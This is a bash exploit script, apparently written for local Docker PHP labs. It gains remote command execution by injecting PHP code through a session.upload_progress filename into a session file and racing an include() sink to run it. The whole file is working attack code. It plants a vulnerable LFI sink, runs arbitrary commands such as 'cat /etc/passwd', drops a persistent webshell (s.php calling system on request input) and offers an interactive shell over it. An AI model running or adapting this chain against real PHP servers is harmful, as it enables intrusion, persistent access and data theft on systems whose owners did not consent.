#!/usr/bin/env bash
# php2shell — RCE against the local p2slab Docker labs (chain A: simplest chain).
#
# Chain A = session.upload_progress filename injection + an include() sink.
# No memory corruption, no ASLR leak, no gadget: one multipart POST plants PHP
# code into the session file, an include() executes it.
#
# Preconditions this script satisfies for you:
#   - /vuln.php (LFI sink) exists in the container  -> docker cp if missing
#   - /tmp is writable by www-data (bind mount perms) -> chmod 1777 on the host
#
# Usage:
#   ./rce.sh                       # RCE 8081 + 8082, print proof, exit
#   ./rce.sh -c 'cat /etc/passwd'  # run one command on every lab
#   ./rce.sh -i                    # interactive: drop webshell, keep the session
#   ./rce.sh -t 8081               # only one target
#   ./rce.sh --drop-shell          # also leave /s.php behind (persistent session)
#
set -uo pipefail

PORTS="8081,8082"
CMD="id; hostname; php -v | head -1"
INTERACTIVE=0
DROP_SHELL=0
SINK_NAME="vuln.php"
SESSION_DIR="/var/lib/php/sessions"
MARK="P2S"

while [ $# -gt 0 ]; do
  case "$1" in
    -t|--targets) PORTS="$2"; shift 2 ;;
    -c|--cmd)     CMD="$2"; shift 2 ;;
    -i|--interactive) INTERACTIVE=1; shift ;;
    --drop-shell) DROP_SHELL=1; shift ;;
    -h|--help) sed -n '2,20p' "$0"; exit 0 ;;
    *) echo "unknown option: $1" >&2; exit 2 ;;
  esac
done

red()  { printf '\033[31m%s\033[0m\n' "$*"; }
grn()  { printf '\033[32m%s\033[0m\n' "$*"; }
dim()  { printf '\033[2m%s\033[0m\n' "$*"; }

container_for_port() {
  docker ps --format '{{.Names}} {{.Ports}}' 2>/dev/null |
    awk -v p=":$1->" 'index($0, p) { print $1; exit }'
}

# The sink must actually include; a 200 from index.php proves nothing.
sink_live() {
  curl -s --max-time 5 "http://127.0.0.1:$1/$SINK_NAME?page=/etc/passwd" 2>/dev/null |
    grep -q '^root:x:0:0:'
}

ensure_sink() {
  local port="$1" cname tmp
  sink_live "$port" && return 0
  cname="$(container_for_port "$port")"
  if [ -z "$cname" ]; then
    red "  no container mapped to :$port and no live sink — cannot continue"
    return 1
  fi
  tmp="$(mktemp -d)"
  cat > "$tmp/$SINK_NAME" <<'PHP'
<?php
declare(strict_types=1);
require __DIR__ . '/lib.php';
// LFI sink: template loader with a user-controlled path (chain A precondition).
$page = $_GET['page'] ?? 'home.php';
include($page);
PHP
  printf '<?php echo "home"; ?>\n' > "$tmp/home.php"
  docker cp "$tmp/$SINK_NAME" "$cname:/var/www/html/$SINK_NAME" >/dev/null 2>&1
  docker cp "$tmp/home.php"  "$cname:/var/www/html/home.php"  >/dev/null 2>&1
  rm -rf "$tmp"
  sleep 0.3
  sink_live "$port"
}

# www-data must be able to create the upload temp file, otherwise every
# multipart POST silently arrives empty (size=0).
ensure_tmp_writable() {
  local cname="$1"
  docker exec -u www-data "$cname" sh -c 'touch /tmp/.p2s_probe 2>/dev/null && rm -f /tmp/.p2s_probe' \
    >/dev/null 2>&1 && return 0
  local src
  src="$(docker inspect "$cname" --format '{{range .Mounts}}{{if eq .Destination "/tmp"}}{{.Source}}{{end}}{{end}}' 2>/dev/null)"
  if [ -n "$src" ] && [ -d "$src" ]; then
    chmod 1777 "$src" 2>/dev/null && dim "  fixed /tmp perms on $src" && return 0
  fi
  red "  /tmp is not writable by www-data in $cname — uploads will arrive empty"
  return 1
}

# One plant + N racing readers. Returns the command output on stdout.
chain_a() {
  local port="$1" cmd="$2" cname="$3"
  local sid b64 code body boundary dir
  sid="p2s$(date +%s%N | sha256sum | cut -c1-16)"
  boundary="----P2S$(date +%s%N | sha256sum | cut -c1-8)"
  b64="$(printf '%s' "$cmd" | base64 -w0)"
  # Output is base64'd so it stays on one line: sed/grep cannot match a marker
  # pair across newlines, and command output routinely has them.
  code="<?php ob_start(); system(base64_decode('${b64}')); \$o=ob_get_clean(); echo '${MARK}_S'.base64_encode(\$o).'${MARK}_E'; ?>"
  body="$(mktemp)"

  # 15MB of filler keeps the parser busy long enough for a reader to win the
  # race against session.upload_progress.cleanup=On.
  {
    printf -- '--%s\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nK\r\n' "$boundary"
    printf -- '--%s\r\nContent-Disposition: form-data; name="f"; filename="%s"\r\n' "$boundary" "$code"
    printf 'Content-Type: application/octet-stream\r\n\r\n'
    head -c 15000000 /dev/zero | tr '\0' 'Z'
    printf '\r\n--%s--\r\n' "$boundary"
  } > "$body"

  dir="$SESSION_DIR"
  local tmp hit
  tmp="$(mktemp -d)"; hit="$tmp/hit"

  # readers: hammer the include() while the POST is being parsed. Each reader
  # owns its output file — a shared file would be truncated by whichever
  # reader finished last, usually the one that matched nothing.
  local i
  for i in $(seq 1 6); do
    (
      while [ ! -f "$hit" ]; do
        curl -s --max-time 2 "http://127.0.0.1:$port/$SINK_NAME?page=$dir/sess_$sid" 2>/dev/null \
          | grep -o "${MARK}_S[A-Za-z0-9+/=]*${MARK}_E" | head -1 \
          | sed "s/^${MARK}_S//; s/${MARK}_E\$//" | base64 -d > "$tmp/r$i" 2>/dev/null
        [ -s "$tmp/r$i" ] && { : > "$hit"; break; }
      done
    ) &
  done

  curl -s --max-time 30 -o /dev/null \
    -H "Content-Type: multipart/form-data; boundary=$boundary" \
    -H 'Expect:' -H "Cookie: PHPSESSID=$sid" \
    --data-binary "@$body" "http://127.0.0.1:$port/upload.php" 2>/dev/null

  local w
  local _i
  for _i in $(seq 1 40); do [ -f "$hit" ] && break; sleep 0.05; done
  : > "$hit"; wait 2>/dev/null
  rm -f "$body"

  local found=""
  for i in $(seq 1 6); do
    if [ -s "$tmp/r$i" ]; then found="$tmp/r$i"; break; fi
  done
  if [ -n "$found" ]; then cat "$found"; rm -rf "$tmp"; return 0; fi
  rm -rf "$tmp"
  return 1
}

drop_webshell() {
  local port="$1"
  local code='<?php echo "P2S_WEBSHELL"; system($_REQUEST[0]); ?>'
  local b64
  b64="$(printf '%s' "$code" | base64 -w0)"
  chain_a "$port" "echo $b64 | base64 -d > /var/www/html/s.php" "$2" >/dev/null
  curl -s --max-time 5 -d '0=echo READY' "http://127.0.0.1:$port/s.php" 2>/dev/null | grep -q READY
}

run_via_shell() {
  curl -s --max-time 30 --data-urlencode "0=$2" "http://127.0.0.1:$1/s.php" 2>/dev/null |
    sed 's/^P2S_WEBSHELL//'
}

interactive() {
  local port="$1"
  echo
  grn "session on :$port  (webshell /s.php, type 'exit' to leave)"
  local line
  while true; do
    printf '\033[36mwww-data@:%s\033[0m$ ' "$port"
    IFS= read -r line || break
    [ -z "$line" ] && continue
    [ "$line" = "exit" ] && break
    run_via_shell "$port" "$line"
  done
}

main() {
  local rc=0
  IFS=',' read -ra targets <<< "$PORTS"
  for port in "${targets[@]}"; do
    port="${port//[[:space:]]/}"
    [ -z "$port" ] && continue
    echo
    dim "=== 127.0.0.1:$port"
    if ! curl -sf --max-time 5 "http://127.0.0.1:$port/health.php" >/dev/null 2>&1; then
      red "  no lab answering on :$port"; rc=1; continue
    fi
    local cname ver
    cname="$(container_for_port "$port")"
    ver="$(curl -s --max-time 5 "http://127.0.0.1:$port/health.php" | sed -n 's/.*"php":"\([^"]*\)".*/\1/p')"
    dim "  php $ver  container ${cname:-unknown}"

    ensure_tmp_writable "$cname" || { rc=1; continue; }
    if ! ensure_sink "$port"; then
      red "  cannot establish the LFI sink"; rc=1; continue
    fi

    local out
    if ! out="$(chain_a "$port" "$CMD" "$cname")"; then
      red "  chain A failed (race lost?) — retry once"
      out="$(chain_a "$port" "$CMD" "$cname")" || { red "  no RCE"; rc=1; continue; }
    fi
    grn "  RCE confirmed:"
    printf '%s\n' "$out" | sed 's/^/    /'

    if [ "$DROP_SHELL" = 1 ] || [ "$INTERACTIVE" = 1 ]; then
      if drop_webshell "$port" "$cname"; then
        grn "  persistent shell: http://127.0.0.1:$port/s.php?0=<cmd>"
      else
        red "  webshell drop failed"; rc=1
      fi
    fi

    if [ "$INTERACTIVE" = 1 ]; then interactive "$port"; fi
  done
  echo
  [ "$rc" = 0 ] && grn "done" || red "finished with errors"
  return "$rc"
}

main
